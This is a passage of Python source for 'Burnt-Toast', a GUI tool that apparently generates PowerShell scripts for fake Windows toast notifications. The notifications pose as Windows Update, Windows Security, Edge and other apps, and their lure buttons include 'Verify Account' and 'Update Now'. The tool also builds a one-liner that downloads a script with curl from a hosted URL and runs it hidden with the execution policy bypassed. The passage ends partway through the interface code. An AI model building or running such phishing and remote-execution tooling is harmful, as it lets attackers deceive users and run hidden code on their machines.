import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import subprocess, sys, textwrap, threading

# Palette 
BG         = "#0e0e0f"
PANEL      = "#141416"
BORDER     = "#232328"
ACCENT     = "#d97706"
ACCENT_DIM = "#92400e"
TEXT       = "#e8e6e1"
MUTED      = "#52525b"
SUB        = "#3f3f46"
SUCCESS    = "#a3a3a3"
DIM        = "#18181b"

TOAST_BG     = "#1f1f1f"
TOAST_BORDER = "#2d2d2d"
TOAST_APP    = "#8a8a8a"
TOAST_TITLE  = "#f3f3f3"
TOAST_BODY   = "#b0b0b0"
TOAST_BTN    = "#2a2a2a"
TOAST_BTN_FG = "#d97706"

FONT_MONO  = ("Consolas", 9)
FONT_MONOB = ("Consolas", 9,  "bold")
FONT_HEAD  = ("Consolas", 17, "bold")
FONT_SMALL = ("Consolas", 8)

# Realistic default button labels per mode 
# basic / picture: single "open" button — use legit-looking MS labels
BASIC_OPEN_DEFAULTS = [
    "Open",
    "View Details",
    "Sign In",
    "Continue",
    "Learn More",
    "Restart Now",
    "Update Now",
    "Verify Account",
    "Review Activity",
    "Get Started",
]

# game mode: launch + update
GAME_LAUNCH_DEFAULTS = [
    "Play Now",
    "Launch Game",
    "Resume",
    "Join Session",
]
GAME_UPDATE_DEFAULTS = [
    "Update",
    "Download Update",
    "Install Now",
    "Get Update",
]

# Static AUMID fallback list
FALLBACK_AUMIDS = [
    ("Microsoft Edge",          "MSEdge"),
    ("Windows Explorer",        "Microsoft.Windows.Explorer"),
    ("Microsoft Store",         "Microsoft.WindowsStore_8wekyb3d8bbwe!App"),
    ("Windows Terminal",        "Microsoft.WindowsTerminal_8wekyb3d8bbwe!App"),
    ("Mail",                    "microsoft.windowscommunicationsapps_8wekyb3d8bbwe!microsoft.windowslive.mail"),
    ("Windows Update",          "Windows.SystemToast.WindowsUpdate.MoNotification2"),
    ("Notepad",                 "Microsoft.WindowsNotepad_8wekyb3d8bbwe!App"),
    ("OneDrive",                "Microsoft.SkyDrive.Desktop"),
    ("Photos",                  "Microsoft.WindowsPhotos_8wekyb3d8bbwe!App"),
    ("Calculator",              "Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"),
    ("Xbox",                    "Microsoft.XboxApp_8wekyb3d8bbwe!Microsoft.XboxApp"),
    ("Xbox Game Bar",           "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe!App"),
    ("Spotify",                 "SpotifyAB.SpotifyMusic_zpdnekdrzrea0!Spotify"),
    ("Discord",                 "com.squirrel.Discord.Discord"),
    ("Steam",                   "Steam"),
    ("Windows Security",        "Windows.Defender.SecurityCenter"),
    ("Snipping Tool",           "Microsoft.ScreenSketch_8wekyb3d8bbwe!App"),
    ("Clock / Alarms",          "Microsoft.WindowsAlarms_8wekyb3d8bbwe!App"),
    ("Weather",                 "Microsoft.BingWeather_8wekyb3d8bbwe!App"),
    ("News",                    "Microsoft.BingNews_8wekyb3d8bbwe!AppexNews"),
    ("Settings",                "windows.immersivecontrolpanel_cw5n1txyewy!microsoft.windows.immersivecontrolpanel"),
    ("Teams",                   "MSTeams_8wekyb3d8bbwe!MSTeams"),
    ("Windows Security (Full)", "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI"),
]

COMMON_PROTOCOLS = [
    ("Calculator",   "ms-calculator:"),
    ("Settings",     "ms-settings:"),
    ("Mail",         "ms-mail:"),
    ("Maps",         "ms-drive-to:"),
    ("Store",        "ms-windows-store:"),
    ("Xbox",         "xbox:"),
    ("Steam Game",   "steam://run/APPID"),
    ("Epic Game",    "com.epicgames.launcher://apps/APPID?action=launch"),
    ("Battle.net",   "battlenet://GAMEID"),
    ("Teams Chat",   "msteams:/l/chat/"),
    ("Teams Meet",   "msteams:/l/meeting/join?confId=ID"),
]

# PS snippet to enumerate AUMIDs from registry (both HKCU and HKLM)
PS_ENUM_AUMIDS = r"""
$paths = @(
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings'
)
$results = foreach ($p in $paths) {
    if (Test-Path $p) { Get-ChildItem $p | Select-Object -ExpandProperty PSChildName }
}
# also pull UWP / Start Menu
$uwp = try { Get-StartApps | Select-Object -ExpandProperty AppID } catch {}
($results + $uwp) | Where-Object { $_ } | Sort-Object -Unique
"""


#  Widget helpers 

def styled_entry(parent, textvariable=None, width=40):
    return tk.Entry(parent, textvariable=textvariable, width=width,
                    bg=BORDER, fg=TEXT, insertbackground=ACCENT,
                    relief="flat", font=FONT_MONO,
                    highlightthickness=1,
                    highlightbackground=SUB,
                    highlightcolor=ACCENT)


def styled_label(parent, text, color=MUTED, font=FONT_MONOB):
    return tk.Label(parent, text=text, bg=PANEL, fg=color, font=font)


def section_frame(parent, title):
    outer = tk.Frame(parent, bg=SUB, padx=1, pady=1)
    inner = tk.Frame(outer, bg=PANEL, padx=16, pady=12)
    inner.pack(fill="both", expand=True)
    tk.Label(inner, text=title, bg=PANEL, fg=ACCENT,
             font=FONT_MONOB).pack(anchor="w", pady=(0, 8))
    return outer, inner


def field_row(parent, label, var, placeholder="", toggle_var=None):
    row = tk.Frame(parent, bg=PANEL)
    row.pack(fill="x", pady=3)
    hdr = tk.Frame(row, bg=PANEL)
    hdr.pack(fill="x")
    if toggle_var is not None:
        tk.Checkbutton(hdr, variable=toggle_var, bg=PANEL, fg=TEXT,
                       selectcolor=DIM, activebackground=PANEL,
                       activeforeground=ACCENT).pack(side="left", padx=(0, 4))
    styled_label(hdr, label, color=MUTED).pack(side="left", anchor="w")
    e = styled_entry(row, textvariable=var, width=55)
    e.pack(fill="x", pady=(2, 0))
    e._placeholder = placeholder
    if placeholder and not var.get():
        e.insert(0, placeholder)
        e.config(fg=MUTED)
        def on_in(ev, en=e, ph=placeholder):
            if en.get() == ph:
                en.delete(0, "end"); en.config(fg=TEXT)
        def on_out(ev, en=e, ph=placeholder, v=var):
            if not en.get():
                en.insert(0, ph); en.config(fg=MUTED); v.set("")
        e.bind("<FocusIn>",  on_in)
        e.bind("<FocusOut>", on_out)
    return row, e


def real_value(entry, fallback=""):
    val = entry.get()
    ph  = getattr(entry, "_placeholder", None)
    if val and val != ph:
        return val
    return fallback


#  Script generator 

def gen_universal(v):
    """
    The generated .ps1 takes NO parameters — values are baked in.
    This is what gets uploaded and run with the one-liner (no args passed).
    """
    text_lines = []
    if v["use_sub"]     and v["sub"]:     text_lines.append(f"      <text>{v['sub']}</text>")
    if v["use_title"]   and v["title"]:   text_lines.append(f"      <text>{v['title']}</text>")
    if v["use_message"] and v["message"]: text_lines.append(f"      <text>{v['message']}</text>")

    img_line = ""
    if v["mode"] in ("picture", "all") and v["image"]:
        img_line = f'      <image placement="appLogoOverride" src="{v["image"]}" hint-crop="circle"/>\n'

    binding = img_line + "\n".join(text_lines)

    actions = []
    if v["mode"] in ("basic", "picture", "all"):
        if v["use_open_label"] and v["use_url"] and v["url"]:
            actions.append(
                f'    <action content="{v["open_label"]}"\n'
                f'            activationType="protocol"\n'
                f'            arguments="{v["url"]}"/>')
    if v["mode"] in ("game", "all"):
        if v["use_launch_label"] and v["game"]:
            actions.append(
                f'    <action content="{v["launch_label"]}"\n'
                f'            activationType="protocol"\n'
                f'            arguments="{v["game"]}"/>')
        if v["use_update_label"] and v["use_url"] and v["url"]:
            actions.append(
                f'    <action content="{v["update_label"]}"\n'
                f'            activationType="protocol"\n'
                f'            arguments="{v["url"]}"/>')
    if v["use_dismiss"]:
        actions.append(
            '    <action content="Dismiss"\n'
            '            activationType="system"\n'
            '            arguments="dismiss"/>')

    actions_block = ""
    if actions:
        actions_block = "  <actions>\n" + "\n".join(actions) + "\n  </actions>\n"

    aumid = v["aumid"] or "MSEdge"

    return f'''# Burnt-Toast — generated notification script
# Ref: https://brmk.me/posts/toast-my-way/
# Authorized red-team / security research use only.
# No parameters — values are baked in at generation time.

Add-Type -AssemblyName System.Runtime.WindowsRuntime
$null = [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime]
$null = [Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType=WindowsRuntime]

$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
{binding}
    </binding>
  </visual>
{actions_block}</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("{aumid}")
$notifier.Show($toast)
'''


def gen_oneliner(script_url, fname="n.ps1"):
    """
    Matches the working pattern exactly:
      powershell Set-ExecutionPolicy ... && cmd /c curl -o %USERPROFILE%\n.ps1 <URL> && powershell ... -c "%USERPROFILE%\n.ps1"

    Split into two separate parts:
      part1 — the unsigned/execution-policy bypass (run once per machine)
      part2 — the actual grab-and-run (repeat as needed)
    """
    local = f"%USERPROFILE%\\{fname}"

    part1 = (
        "powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
    )

    part2 = (
        f"cmd /c curl -o {local} {script_url} && "
        f"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c \"{local}\""
    )

    combined = f"{part1} && {part2}"

    return part1, part2, combined


def build_preview_xml(v):
    text_lines = []
    if v["use_sub"]     and v["sub"]:     text_lines.append(f"      <text>{v['sub']}</text>")
    if v["use_title"]   and v["title"]:   text_lines.append(f"      <text>{v['title']}</text>")
    if v["use_message"] and v["message"]: text_lines.append(f"      <text>{v['message']}</text>")

    img_line = ""
    if v["mode"] in ("picture", "all") and v["image"]:
        img_line = f'      <image placement="appLogoOverride" src="{v["image"]}" hint-crop="circle"/>\n'

    binding = img_line + "\n".join(text_lines)

    actions = []
    if v["mode"] in ("basic", "picture", "all") and v["use_open_label"] and v["use_url"] and v["url"]:
        actions.append(
            f'    <action content="{v["open_label"]}"\n'
            f'            activationType="protocol"\n'
            f'            arguments="{v["url"]}"/>')
    if v["mode"] in ("game", "all"):
        if v["use_launch_label"] and v["game"]:
            actions.append(
                f'    <action content="{v["launch_label"]}"\n'
                f'            activationType="protocol"\n'
                f'            arguments="{v["game"]}"/>')
        if v["use_update_label"] and v["use_url"] and v["url"]:
            actions.append(
                f'    <action content="{v["update_label"]}"\n'
                f'            activationType="protocol"\n'
                f'            arguments="{v["url"]}"/>')
    if v["use_dismiss"]:
        actions.append(
            '    <action content="Dismiss"\n'
            '            activationType="system"\n'
            '            arguments="dismiss"/>')

    actions_block = ""
    if actions:
        actions_block = "  <actions>\n" + "\n".join(actions) + "\n  </actions>\n"

    return f"""<toast>
  <visual>
    <binding template="ToastGeneric">
{binding}
    </binding>
  </visual>
{actions_block}</toast>"""


# Scrollable frame 

class ScrollableFrame(tk.Frame):
    def __init__(self, parent, bg=BG, **kwargs):
        super().__init__(parent, bg=bg, **kwargs)
        self._cv = tk.Canvas(self, bg=bg, highlightthickness=0, bd=0)
        sb = ttk.Scrollbar(self, orient="vertical", command=self._cv.yview)
        self.inner = tk.Frame(self._cv, bg=bg)
        self.inner.bind("<Configure>",
            lambda e: self._cv.configure(scrollregion=self._cv.bbox("all")))
        self._cv.create_window((0, 0), window=self.inner, anchor="nw")
        self._cv.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y")
        self._cv.pack(side="left", fill="both", expand=True)
        self._cv.bind("<Enter>",  lambda e: self._cv.bind_all("<MouseWheel>", self._wheel))
        self._cv.bind("<Leave>",  lambda e: self._cv.unbind_all("<MouseWheel>"))

    def _wheel(self, e):
        self._cv.yview_scroll(int(-1 * (e.delta / 120)), "units")


# Toast preview canvas 

class ToastPreview(tk.Canvas):
    W, H = 380, 108

    def __init__(self, parent, **kwargs):
        super().__init__(parent, bg=PANEL, highlightthickness=0, bd=0,
                         width=self.W + 2, height=self.H + 40, **kwargs)
        self._draw_empty()

    def _draw_empty(self):
        self.delete("all")
        self.create_rectangle(1, 20, self.W + 1, self.H + 20,
                              outline=SUB, dash=(4, 4), width=1)
        self.create_text(self.W // 2 + 1, self.H // 2 + 20,
                         text="preview updates on generate",
                         fill=MUTED, font=FONT_SMALL, anchor="center")

    def update_preview(self, v):
        self.delete("all")
        x0, y0 = 1, 20
        x1, y1 = self.W + 1, self.H + 20

        self.create_rectangle(x0 + 2, y0 + 2, x1 + 2, y1 + 2, fill="#0a0a0a", outline="")
        self.create_rectangle(x0, y0, x1, y1, fill=TOAST_BG, outline=TOAST_BORDER, width=1)

        aumid = v.get("aumid", "MSEdge")
        app_label = aumid.split("_")[0].split(".")[-1] if "." in aumid else aumid
        self.create_text(x0 + 12, y0 + 12, text=f"● {app_label[:28]}",
                         fill=TOAST_APP, font=FONT_SMALL, anchor="w")
        self.create_text(x1 - 10, y0 + 12, text="now", fill=MUTED, font=FONT_SMALL, anchor="e")
        self.create_line(x0, y0 + 22, x1, y0 + 22, fill=TOAST_BORDER, width=1)

        title_txt = ""
        if v.get("use_sub") and v.get("sub"):       title_txt = v["sub"]
        elif v.get("use_title") and v.get("title"): title_txt = v["title"]
        self.create_text(x0 + 12, y0 + 34, text=(title_txt or "(no title)")[:46],
                         fill=TOAST_TITLE, font=FONT_MONOB, anchor="w")

        body_txt = ""
        if v.get("use_message") and v.get("message"): body_txt = v["message"]
        elif v.get("use_title") and title_txt != v.get("title", ""):
            body_txt = v.get("title", "")
        for i, line in enumerate(textwrap.wrap(body_txt[:120], width=48)[:2]):
            self.create_text(x0 + 12, y0 + 50 + i * 13,
                             text=line, fill=TOAST_BODY, font=FONT_SMALL, anchor="w")

        btns = []
        if v.get("mode") in ("basic", "picture", "all") and v.get("use_open_label") and v.get("open_label"):
            btns.append(v["open_label"])
        if v.get("mode") in ("game", "all"):
            if v.get("use_launch_label") and v.get("launch_label"): btns.append(v["launch_label"])
            if v.get("use_update_label") and v.get("update_label"): btns.append(v["update_label"])
        if v.get("use_dismiss"): btns.append("Dismiss")

        bx = x0 + 12
        by = y1 - 18
        for label in btns[:3]:
            bw = min(len(label) * 7 + 16, 110)
            self.create_rectangle(bx, by - 10, bx + bw, by + 8, fill=TOAST_BTN, outline=SUB, width=1)
            self.create_text(bx + bw // 2, by - 1, text=label[:14],
                             fill=TOAST_BTN_FG, font=FONT_SMALL, anchor="center")
            bx += bw + 6


# App 

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Burnt-Toast")
        self.configure(bg=BG)
        self.geometry("1200x960")
        self.resizable(True, True)
        self._live_aumids = []   # populated by fetch thread
        self._build_ui()

    def _build_ui(self):
        # Header
        hdr = tk.Frame(self, bg=BG, padx=28, pady=16)
        hdr.pack(fill="x", side="top")
        tk.Label(hdr, text="BURNT-TOAST", bg=BG, fg=TEXT, font=FONT_HEAD).pack(side="left")
        tk.Label(hdr, text="  /  notification script generator",
                 bg=BG, fg=MUTED, font=FONT_MONO).pack(side="left", pady=(6, 0))
        tk.Frame(self, bg=ACCENT, height=1).pack(fill="x", side="top")

        # Bottom bar
        tk.Frame(self, bg=BORDER, height=1).pack(fill="x", side="bottom")
        self.status_var = tk.StringVar(value="ready.")
        tk.Label(self, textvariable=self.status_var, bg=BG, fg=MUTED,
                 font=FONT_SMALL, anchor="w", padx=28).pack(fill="x", side="bottom", pady=(0, 5))
        btn_bar = tk.Frame(self, bg=DIM, padx=24, pady=10)
        btn_bar.pack(fill="x", side="bottom")
        self._btn(btn_bar, "GENERATE",        self._generate,           ACCENT,     fg="#0e0e0f").pack(side="left", padx=(0, 6))
        self._btn(btn_bar, "SAVE .PS1",       self._save_script,        BORDER,     fg=TEXT    ).pack(side="left", padx=(0, 6))
        self._btn(btn_bar, "COPY ONE-LINER",  self._copy_oneliner,      BORDER,     fg=TEXT    ).pack(side="left", padx=(0, 6))
        tk.Frame(btn_bar, bg=SUB, width=1, height=28).pack(side="left", padx=12)
        self._btn(btn_bar, "⚡ FIRE LOCAL",   self._fire_inline,        ACCENT_DIM, fg=TEXT    ).pack(side="left", padx=(0, 6))
        self._btn(btn_bar, "NOTIF SETTINGS",  self._open_notif_settings, BORDER,    fg=MUTED   ).pack(side="right")
        tk.Frame(self, bg=BORDER, height=1).pack(fill="x", side="bottom")

        # Main content
        content = tk.Frame(self, bg=BG, padx=18, pady=12)
        content.pack(fill="both", expand=True, side="top")

        # Left scrollable config
        sf = ScrollableFrame(content, bg=BG)
        sf.pack(side="left", fill="both", expand=True, padx=(0, 10))
        left = sf.inner

        #  Notification Type
        mo, mi = section_frame(left, "NOTIFICATION TYPE")
        mo.pack(fill="x", pady=(0, 6))
        self.mode = tk.StringVar(value="basic")
        modes = [
            ("basic",   "Basic        —  title + message + open link"),
            ("picture", "Picture      —  adds app logo/icon override"),
            ("game",    "Launch URI   —  URI launch + link buttons"),
            ("all",     "All          —  full feature set"),
        ]
        for val, lbl in modes:
            tk.Radiobutton(mi, text=lbl, variable=self.mode, value=val,
                           bg=PANEL, fg=TEXT, selectcolor=DIM,
                           activebackground=PANEL, activeforeground=ACCENT,
                           font=FONT_MONO, command=self._refresh_fields).pack(anchor="w", pady=1)

        # Content Elements 
        self.v_use_sub     = tk.BooleanVar(value=True)
        self.v_use_title   = tk.BooleanVar(value=True)
        self.v_use_message = tk.BooleanVar(value=True)
        self.v_use_url     = tk.BooleanVar(value=True)
        self.v_sub         = tk.StringVar()
        self.v_title       = tk.StringVar()
        self.v_message     = tk.StringVar()
        self.v_url         = tk.StringVar()
        self.v_aumid       = tk.StringVar(value="MSEdge")

        self.co, self.ci = section_frame(left, "CONTENT ")
        self.co.pack(fill="x", pady=(0, 6))
        _, self.e_sub     = field_row(self.ci, "SUBTITLE",       self.v_sub,     "System Alert",          self.v_use_sub)
        _, self.e_title   = field_row(self.ci, "TITLE",          self.v_title,   "Update Available",      self.v_use_title)
        _, self.e_message = field_row(self.ci, "MESSAGE",        self.v_message, "A new version is ready.", self.v_use_message)
        _, self.e_url     = field_row(self.ci, "URL", self.v_url,     "https://your-site.com", self.v_use_url)
        _, self.e_aumid   = field_row(self.ci, "AUMID  (pick from AUMID tab →)", self.v_aumid)

        # Action Buttons — mode-aware 
        self.v_use_open_label   = tk.BooleanVar(value=True)
        self.v_use_launch_label = tk.BooleanVar(value=True)
        self.v_use_update_label = tk.BooleanVar(value=True)
        self.v_use_dismiss      = tk.BooleanVar(value=True)
        self.v_open_label       = tk.StringVar(value="View Details")
        self.v_launch_label     = tk.StringVar(value="Play Now")
        self.v_update_label     = tk.StringVar(value="Install Now")

        self.bo, self.bi = section_frame(left, "ACTION BUTTONS  ☑ toggle + edit label")
        self.bo.pack(fill="x", pady=(0, 6))

        # Open button row — shown for basic / picture / all
        self.row_open, self.e_open_label = field_row(
            self.bi, "OPEN / MAIN  (Basic · Picture · All)",
            self.v_open_label, toggle_var=self.v_use_open_label)

        # Quick-pick dropdown for open label
        open_pick_row = tk.Frame(self.bi, bg=PANEL)
        open_pick_row.pack(fill="x", pady=(0, 4))
        tk.Label(open_pick_row, text="quick pick:", bg=PANEL, fg=MUTED, font=FONT_SMALL).pack(side="left", padx=(20, 4))
        self._open_pick_var = tk.StringVar(value=BASIC_OPEN_DEFAULTS[0])
        om = ttk.OptionMenu(open_pick_row, self._open_pick_var, BASIC_OPEN_DEFAULTS[0], *BASIC_OPEN_DEFAULTS,
                            command=lambda v: self.v_open_label.set(v))
        om.config(width=14)
        om.pack(side="left")
        self._open_pick_row = open_pick_row

        # Launch button row — shown for game / all only
        self.row_launch, self.e_launch_label = field_row(
            self.bi, "LAUNCH URI ",
            self.v_launch_label, toggle_var=self.v_use_launch_label)
        launch_pick_row = tk.Frame(self.bi, bg=PANEL)
        tk.Label(launch_pick_row, text="quick pick:", bg=PANEL, fg=MUTED, font=FONT_SMALL).pack(side="left", padx=(20, 4))
        self._launch_pick_var = tk.StringVar(value=GAME_LAUNCH_DEFAULTS[0])
        om2 = ttk.OptionMenu(launch_pick_row, self._launch_pick_var, GAME_LAUNCH_DEFAULTS[0], *GAME_LAUNCH_DEFAULTS,
                             command=lambda v: self.v_launch_label.set(v))
        om2.config(width=14)
        om2.pack(side="left")
        self._launch_pick_row = launch_pick_row

        # Update button row — shown for game / all only
        self.row_update, self.e_update_label = field_row(
            self.bi, "button to URL",
            self.v_update_label, toggle_var=self.v_use_update_label)
        update_pick_row = tk.Frame(self.bi, bg=PANEL)
        tk.Label(update_pick_row, text="quick pick:", bg=PANEL, fg=MUTED, font=FONT_SMALL).pack(side="left", padx=(20, 4))
        self._update_pick_var = tk.StringVar(value=GAME_UPDATE_DEFAULTS[0])
        om3 = ttk.OptionMenu(update_pick_row, self._update_pick_var, GAME_UPDATE_DEFAULTS[0], *GAME_UPDATE_DEFAULTS,
                             command=lambda v: self.v_update_label.set(v))
        om3.config(width=14)
        om3.pack(side="left")
        self._update_pick_row = update_pick_row

        # Dismiss
        dismiss_row = tk.Frame(self.bi, bg=PANEL)
        dismiss_row.pack(fill="x", pady=(5, 0))
        tk.Checkbutton(dismiss_row, variable=self.v_use_dismiss,
                       bg=PANEL, fg=TEXT, selectcolor=DIM,
                       activebackground=PANEL, activeforeground=ACCENT).pack(side="left", padx=(0, 4))
        styled_label(dismiss_row, "DISMISS BUTTON  (all modes)").pack(side="left")

        # ── Extras ────────────────────────────────────────────────────────────
        self.extra_outer, self.extra_inner = section_frame(left, "EXTRAS")
        self.extra_outer.pack(fill="x", pady=(0, 6))
        self.v_image = tk.StringVar()
        self.v_game  = tk.StringVar()

        self.img_row = tk.Frame(self.extra_inner, bg=PANEL)
        styled_label(self.img_row, "IMAGE PATH  (local or URL)").pack(anchor="w")
        img_entry_row = tk.Frame(self.img_row, bg=PANEL)
        img_entry_row.pack(fill="x")
        self.e_image = styled_entry(img_entry_row, textvariable=self.v_image, width=45)
        self.e_image._placeholder = None
        self.e_image.pack(side="left", fill="x", expand=True, pady=(2, 0))
        self._btn(img_entry_row, "Browse", self._browse_image, BORDER, fg=MUTED).pack(side="left", padx=(6, 0), pady=(2, 0))

        self.game_row = tk.Frame(self.extra_inner, bg=PANEL)
        styled_label(self.game_row, "LAUNCH URI  (e.g. steam://run/12345)").pack(anchor="w")
        self.e_game = styled_entry(self.game_row, textvariable=self.v_game, width=55)
        self.e_game._placeholder = None
        self.e_game.pack(fill="x", pady=(2, 0))
        self.lbl_no_extra = styled_label(self.extra_inner, "No extra fields for Basic mode.", MUTED)
        self._refresh_fields()

        # One-Liner Config 
        oo, oi = section_frame(left, "ONE-LINER CONFIG")
        oo.pack(fill="x", pady=(0, 6))

        # Suggested host hint
        hint_row = tk.Frame(oi, bg=PANEL)
        hint_row.pack(fill="x", pady=(0, 6))
        tk.Label(hint_row, text="tip: ", bg=PANEL, fg=MUTED, font=FONT_SMALL).pack(side="left")
        tip_lbl = tk.Label(hint_row, text="transfer.whalebone.io  — easy file upload/grab",
                           bg=PANEL, fg=ACCENT, font=FONT_SMALL, cursor="hand2")
        tip_lbl.pack(side="left")
        tip_lbl.bind("<Button-1>", lambda e: self._open_url("https://transfer.whalebone.io"))

        self.v_host     = tk.StringVar()
        self.v_filename = tk.StringVar(value="n.ps1")
        _, self.e_host     = field_row(oi, "FULL SCRIPT URL  (direct link to hosted .ps1)",
                                       self.v_host, " ")
        _, self.e_filename = field_row(oi, "LOCAL FILENAME  (saved to %USERPROFILE%\\)",
                                       self.v_filename)

        # Protocol Reference 
        pr, pi = section_frame(left, "URI PROTOCOL REFERENCE")
        pr.pack(fill="x", pady=(0, 6))
        for name, proto in COMMON_PROTOCOLS:
            prow = tk.Frame(pi, bg=PANEL)
            prow.pack(fill="x", pady=1)
            tk.Label(prow, text=f"{name:<18}", bg=PANEL, fg=MUTED,  font=FONT_SMALL).pack(side="left")
            tk.Label(prow, text=proto,          bg=PANEL, fg=ACCENT, font=FONT_SMALL).pack(side="left")

        # Right output panel 
        right = tk.Frame(content, bg=BG, width=480)
        right.pack(side="right", fill="both", expand=True)
        right.pack_propagate(False)

        prev_outer, prev_inner = section_frame(right, "OUTPUT")
        prev_outer.pack(fill="both", expand=True)

        style = ttk.Style()
        style.theme_use("default")
        style.configure("T.TNotebook",     background=PANEL, borderwidth=0)
        style.configure("T.TNotebook.Tab", background=DIM, foreground=MUTED,
                                           font=FONT_MONOB, padding=[12, 4])
        style.map("T.TNotebook.Tab",
                  background=[("selected", BORDER)],
                  foreground=[("selected", ACCENT)])
        style.configure("TMenubutton", background=BORDER, foreground=TEXT,
                        font=FONT_SMALL, relief="flat")

        nb = ttk.Notebook(prev_inner, style="T.TNotebook")
        nb.pack(fill="both", expand=True)

        self.tab_script   = self._make_text_tab(nb, SUCCESS)
        self.tab_oneliner = self._make_text_tab(nb, TEXT)
        self.tab_aumid    = self._make_aumid_tab(nb)
        self.tab_preview  = self._make_preview_tab(nb)

        nb.add(self.tab_script[0],   text=" SCRIPT ")
        nb.add(self.tab_oneliner[0], text=" ONE-LINER ")
        nb.add(self.tab_aumid,       text=" AUMIDs ")
        nb.add(self.tab_preview,     text=" PREVIEW ")

    # Tab builders 

    def _make_text_tab(self, nb, color):
        frame = tk.Frame(nb, bg=DIM)
        txt = tk.Text(frame, bg=DIM, fg=color,
                      font=FONT_SMALL, relief="flat",
                      wrap="none", state="disabled",
                      highlightthickness=0, insertbackground=ACCENT)
        sy = ttk.Scrollbar(frame, orient="vertical",   command=txt.yview)
        sx = ttk.Scrollbar(frame, orient="horizontal", command=txt.xview)
        txt.config(yscrollcommand=sy.set, xscrollcommand=sx.set)
        sy.pack(side="right",  fill="y")
        sx.pack(side="bottom", fill="x")
        txt.pack(fill="both", expand=True)
        return frame, txt

    def _make_aumid_tab(self, nb):
        frame = tk.Frame(nb, bg=PANEL)

        # Top controls row
        ctrl = tk.Frame(frame, bg=PANEL)
        ctrl.pack(fill="x", padx=12, pady=(10, 5))
        tk.Label(ctrl, text="Click row to auto-fill AUMID field.",
                 bg=PANEL, fg=MUTED, font=FONT_SMALL).pack(side="left")
        self._btn(ctrl, "⟳ FETCH FROM HOST", self._fetch_aumids_async, BORDER, fg=ACCENT).pack(side="right")

        self.aumid_status = tk.StringVar(value="static list — hit FETCH to pull live from this machine")
        tk.Label(frame, textvariable=self.aumid_status,
                 bg=PANEL, fg=MUTED, font=FONT_SMALL, anchor="w").pack(fill="x", padx=12, pady=(0, 4))

        # PS hint
        hint = tk.Frame(frame, bg=BORDER, padx=1, pady=1)
        hint.pack(fill="x", padx=12, pady=(0, 8))
        hi = tk.Frame(hint, bg=DIM, padx=10, pady=7)
        hi.pack(fill="x")
        tk.Label(hi,
                 text="# Manual enumeration:\nGet-StartApps | Select-Object Name, AppID",
                 bg=DIM, fg=ACCENT, font=FONT_SMALL, justify="left").pack(anchor="w")

        # Search bar
        search_row = tk.Frame(frame, bg=PANEL)
        search_row.pack(fill="x", padx=12, pady=(0, 5))
        tk.Label(search_row, text="filter:", bg=PANEL, fg=MUTED, font=FONT_SMALL).pack(side="left", padx=(0, 4))
        self.aumid_filter_var = tk.StringVar()
        fe = styled_entry(search_row, textvariable=self.aumid_filter_var, width=40)
        fe.pack(side="left", fill="x", expand=True)
        self.aumid_filter_var.trace_add("write", lambda *a: self._filter_aumids())

        tf = tk.Frame(frame, bg=PANEL)
        tf.pack(fill="both", expand=True, padx=12, pady=(0, 12))

        style = ttk.Style()
        style.configure("A.Treeview",
                        background="#191919", foreground=TEXT,
                        fieldbackground="#191919",
                        font=FONT_SMALL, rowheight=20, borderwidth=0)
        style.configure("A.Treeview.Heading",
                        background=DIM, foreground=ACCENT,
                        font=FONT_MONOB, relief="flat")
        style.map("A.Treeview",
                  background=[("selected", ACCENT_DIM)],
                  foreground=[("selected", TEXT)])

        self.aumid_tree = ttk.Treeview(tf, columns=("App", "AUMID"),
                                       show="headings", style="A.Treeview",
                                       selectmode="browse")
        self.aumid_tree.heading("App",   text="Application")
        self.aumid_tree.heading("AUMID", text="AUMID")
        self.aumid_tree.column("App",   width=150, minwidth=100)
        self.aumid_tree.column("AUMID", width=280, minwidth=160)

        sy = ttk.Scrollbar(tf, orient="vertical",   command=self.aumid_tree.yview)
        sx = ttk.Scrollbar(tf, orient="horizontal", command=self.aumid_tree.xview)
        self.aumid_tree.config(yscrollcommand=sy.set, xscrollcommand=sx.set)
        sy.pack(side="right",  fill="y")
        sx.pack(side="bottom", fill="x")
        self.aumid_tree.pack(fill="both", expand=True)

        self._populate_aumid_tree(FALLBACK_AUMIDS)

        def on_select(ev):
            sel = self.aumid_tree.selection()
            if sel:
                val = self.aumid_tree.item(sel[0])["values"][1]
                self.e_aumid.delete(0, "end")
                self.e_aumid.insert(0, val)
                self.e_aumid.config(fg=TEXT)
                self.v_aumid.set(val)
                self.status_var.set(f"aumid → {val}")

        self.aumid_tree.bind("<<TreeviewSelect>>", on_select)
        return frame

    def _make_preview_tab(self, nb):
        frame = tk.Frame(nb, bg=PANEL)

        tk.Label(frame, text="Visual mockup — updates on GENERATE.",
                 bg=PANEL, fg=MUTED, font=FONT_SMALL).pack(anchor="w", padx=12, pady=(10, 4))

        self.toast_preview = ToastPreview(frame)
        self.toast_preview.pack(padx=12, pady=4, anchor="w")

        tk.Frame(frame, bg=BORDER, height=1).pack(fill="x", padx=12, pady=8)

        tk.Label(frame, text="LIVE FIRE  —  runs on this machine via PowerShell",
                 bg=PANEL, fg=ACCENT, font=FONT_MONOB).pack(anchor="w", padx=12)
        tk.Label(frame, text="No file written to disk — XML passed inline.",
                 bg=PANEL, fg=MUTED, font=FONT_SMALL).pack(anchor="w", padx=12, pady=(2, 8))

        fire_row = tk.Frame(frame, bg=PANEL)
        fire_row.pack(fill="x", padx=12, pady=(0, 8))
